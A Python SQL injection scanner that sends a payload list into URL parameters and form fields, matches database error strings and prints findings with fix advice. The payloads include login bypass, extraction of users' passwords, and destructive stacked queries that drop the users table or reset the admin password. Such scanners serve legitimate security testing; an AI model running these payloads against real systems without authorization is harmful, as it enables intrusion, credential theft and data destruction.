import time
import re
from urllib.parse import urlparse, urlencode, parse_qs, urlunparse
import requests

# Enhanced SQL Injection payloads with various techniques
SQLI_PAYLOADS = [
    # Basic authentication bypass
    "' OR '1'='1",
    "' OR 1=1--",
    "admin'--",
    
    # Union-based attacks
    "' UNION SELECT NULL--",
    "' UNION SELECT username,password FROM users--",
    "' UNION SELECT NULL,NULL,NULL--",
    
    # Error-based attacks
    "' AND EXTRACTVALUE(1, CONCAT(0x5c, VERSION()))--",
    "' AND 1=CONVERT(int,@@version)--",
    
    # Time-based blind SQLi
    "' OR IF(1=1,SLEEP(5),0)--",
    "' WAITFOR DELAY '0:0:5'--",
    
    # Boolean-based blind SQLi
    "' AND LENGTH(database())=1--",
    "' AND SUBSTRING((SELECT password FROM users WHERE username='admin'),1,1)='a'--",
    
    # Stacked queries (destructive - use with caution)
    "'; DROP TABLE users;--",
    "'; UPDATE users SET password='hacked' WHERE username='admin';--",
]

# Database-specific error patterns for better detection
DB_ERROR_PATTERNS = {
    'mysql': [
        "sql syntax", "mysql", "you have an error in your sql syntax",
        "warning:", "unclosed quotation mark", "quoted string not properly terminated"
    ],
    'postgresql': [
        "postgresql", "pq::", "syntax error at or near",
        "invalid input syntax", "column reference is ambiguous"
    ],
    'mssql': [
        "microsoft odbc", "odbc driver", "sql server", "ora-",
        "incorrect syntax near", "unclosed quotation mark"
    ],
    'oracle': [
        "ora-", "oracle", "pl/sql", "sql command not properly ended"
    ],
    'generic': [
        "sql", "syntax", "database error", "query failed"
    ]
}

class SQLiTester:
    """Enhanced SQL Injection testing class with improved detection and reporting."""
    def __init__(self, session=None, timeout=10):
        self.session = session or requests.Session()
        self.timeout = timeout
        self.findings = []
    
    def find_sql_errors(self, html):
        """Scan server response text for SQL error messages with database-specific patterns."""
        response_text = html.lower()
        
        # Check for database-specific error patterns
        detected_db = None
        specific_pattern = None
        
        for db_type, patterns in DB_ERROR_PATTERNS.items():
            for pattern in patterns:
                if pattern in response_text:
                    detected_db = db_type
                    specific_pattern = pattern
                    return True, f"{db_type} error pattern: {pattern}"
        
        # Check for response length anomalies
        return False, None
    
    def detect_database_type(self, response_text):
        """Attempt to identify the database type based on error messages."""
        response_lower = response_text.lower()
        for db_type, patterns in DB_ERROR_PATTERNS.items():
            for pattern in patterns:
                if pattern in response_lower:
                    return db_type
        return "unknown"
    
    def generate_fix_suggestions(self, vulnerability_type, db_type="generic"):
        """Generate specific fix suggestions based on vulnerability type and database."""
        fixes = {
            'URL parameter': "Use parameterized queries instead of string concatenation",
            'Form field': "Implement input validation and parameterized queries"
        }
        
        base_fix = fixes.get(vulnerability_type, "Use parameterized queries and input validation")
        
        # Database-specific recommendations
        db_specific = {
            'mysql': "Use MySQLi or PDO with prepared statements",
            'postgresql': "Use psycopg2 with parameterized queries",
            'mssql': "Use pyodbc with parameterized queries",
            'oracle': "Use cx_Oracle with parameterized queries",
            'generic': "Use database adapter with parameterized queries"
        }
        
        db_advice = db_specific.get(db_type, db_specific['generic'])
        
        return f"{base_fix}. {db_advice}. Implement proper input validation and escaping."
    
    def test_url_params(self, url):
        """Test URL parameters for SQL injection vulnerabilities."""
        print(f"[*] Testing URL parameters: {url}")
        
        # Parse URL into components 
        parsed = urlparse(url)
        
        # Extract and parse query string 
        query_dict = parse_qs(parsed.query)
        
        if not query_dict:
            print(f"    No query parameters found in {url}")
            return
        
        # Reconstruct base URL without query or fragment 
        base_url = urlunparse((
            parsed.scheme,
            parsed.netloc,
            parsed.path,
            parsed.params,
            '',  # Empty query
            ''   # Empty fragment
        ))
        
        # Test each parameter individually
        for param_name, param_values in query_dict.items():
            for original_value in param_values:
                for payload in SQLI_PAYLOADS:
                    # Create a copy of the query dict and replace one parameter value
                    test_query = query_dict.copy()
                    test_query[param_name] = [payload]
                    
                    # Rebuild the query string 
                    new_query = urlencode(test_query, doseq=True)
                    
                    # Reconstruct the full URL 
                    test_url = urlunparse((
                        parsed.scheme,
                        parsed.netloc,
                        parsed.path,
                        parsed.params,
                        new_query,
                        parsed.fragment
                    ))
                    
                    try:
                        # Send the request
                        response = self.session.get(test_url, timeout=self.timeout)
                        
                        # Check for SQL errors in response
                        found, pattern = self.find_sql_errors(response.text)
                        
                        if found:
                            # Detect database type for specific fix suggestions
                            db_type = self.detect_database_type(response.text)
                            fix_suggestion = self.generate_fix_suggestions('URL parameter', db_type)
                            
                            finding = {
                                'type': 'URL parameter',
                                'url': test_url,
                                'parameter': param_name,
                                'payload': payload,
                                'evidence': pattern,
                                'fix_suggestion': fix_suggestion,
                                'database_type': db_type
                            }
                            self.findings.append(finding)
                            print(f"[!] Potential SQLi vulnerability found in parameter '{param_name}'")
                            print(f"    URL: {test_url}")
                            print(f"    Suggested fix: {fix_suggestion}")
                    
                    except Exception as e:
                        print(f"[!] Error testing URL {test_url}: {e}")
                    
                    # Small delay between requests 
                    time.sleep(0.1)
    
    def test_forms(self, forms_by_url):
        """Test HTML forms for SQL injection vulnerabilities."""
        for url, forms in forms_by_url.items():
            for form in forms:
                print(f"[*] Testing form at {url}")
                
                # Determine form action URL 
                action_url = form['action'] if form['action'] else url
                method = form['method']
                
                # Build default form data
                form_data = {}
                for input_field in form['inputs']:
                    input_name = input_field['name']
                    if not input_name:
                        continue
                    
                    # Use default value if present, otherwise use "test"
                    form_data[input_name] = input_field.get('value', 'test')
                
                # Test each form field
                for input_field in form['inputs']:
                    input_name = input_field['name']
                    if not input_name:
                        continue
                    
                    for payload in SQLI_PAYLOADS:
                        # Create test data with payload in one field
                        test_data = form_data.copy()
                        test_data[input_name] = payload
                        
                        try:
                            # Submit the form
                            if method == 'get':
                                response = self.session.get(action_url, params=test_data, timeout=self.timeout)
                            else:
                                response = self.session.post(action_url, data=test_data, timeout=self.timeout)
                            
                            # Check for SQL errors
                            found, pattern = self.find_sql_errors(response.text)
                            
                            if found:
                                # Detect database type for specific fix suggestions
                                db_type = self.detect_database_type(response.text)
                                fix_suggestion = self.generate_fix_suggestions('Form field', db_type)
                                
                                finding = {
                                    'type': 'Form field',
                                    'url': url,
                                    'action': action_url,
                                    'field': input_name,
                                    'payload': payload,
                                    'evidence': pattern,
                                    'fix_suggestion': fix_suggestion,
                                    'database_type': db_type
                                }
                                self.findings.append(finding)
                                print(f"[!] Potential SQLi vulnerability found in form field '{input_name}'")
                                print(f"    Form action: {action_url}")
                                print(f"    Suggested fix: {fix_suggestion}")
                        
                        except Exception as e:
                            print(f"[!] Error testing form field {input_name}: {e}")
                        
                        # Small delay between requests 
                        time.sleep(0.1)
    
    def run(self, pages, forms_by_url):
        """Run all SQL injection tests."""
        print("[*] Starting SQL injection tests")
        
        # Test URL parameters on all pages
        for url, html in pages.items():
            self.test_url_params(url)
        
        # Test all forms
        self.test_forms(forms_by_url)
        
        return self.findings
    
    def generate_report(self):
        """Generate a comprehensive report of found vulnerabilities with fix suggestions."""
        if not self.findings:
            print("\n[*] No SQL injection vulnerabilities found.")
            return
        
        print("\n" + "="*80)
        print("SQL INJECTION VULNERABILITY REPORT")
        print("="*80)
        
        for i, finding in enumerate(self.findings, 1):
            print(f"\n{i}. Vulnerability Found:")
            print(f"   Type: {finding['type']}")
            print(f"   URL: {finding['url']}")
            
            if finding['type'] == 'URL parameter':
                print(f"   Parameter: {finding['parameter']}")
            else:
                print(f"   Form Action: {finding['action']}")
                print(f"   Field: {finding['field']}")
            
            print(f"   Payload: {finding['payload']}")
            print(f"   Evidence: {finding['evidence']}")
            print(f"   Database Type: {finding.get('database_type', 'unknown')}")
            print(f"   Suggested Fix: {finding.get('fix_suggestion', 'Use parameterized queries')}")
        
        print(f"\nTotal vulnerabilities found: {len(self.findings)}")
        print("="*80)